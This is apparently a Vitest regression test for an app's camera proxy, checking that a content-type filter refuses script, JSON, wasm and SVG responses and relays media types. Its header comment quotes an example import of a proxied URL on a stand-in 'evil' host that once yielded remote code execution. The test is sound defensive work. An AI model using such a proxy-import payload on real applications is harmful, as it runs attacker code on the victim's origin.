/**
 * The camera proxies stream a remote body back from this app's own origin under
 * the upstream's content type. A script type there makes the response a valid ES
 * module on this origin, which is what turned
 * `import("/api/camera/proxy/iframe?url=https://evil/x.js")` into RCE.
 */
import { describe, expect, it } from "vitest";

import { isUnsafeProxyContentType } from "./proxyContentType";

describe("isUnsafeProxyContentType", () => {
    it.each([
        "application/javascript",
        "text/javascript",
        "application/javascript; charset=utf-8",
        "APPLICATION/JAVASCRIPT",
        "application/ecmascript",
        "application/json",
        "application/wasm",
        "image/svg+xml",
        "text/jscript",
        "text/livescript",
        "TEXT/JSCRIPT; charset=utf-8",
    ])("refuses %s", (contentType) => {
        expect(isUnsafeProxyContentType(contentType)).toBe(true);
    });

    it.each([
        "image/jpeg",
        "multipart/x-mixed-replace; boundary=frame",
        "video/mp4",
        "application/vnd.apple.mpegurl",
        "text/html; charset=utf-8",
        "application/octet-stream",
    ])("relays %s", (contentType) => {
        expect(isUnsafeProxyContentType(contentType)).toBe(false);
    });
});
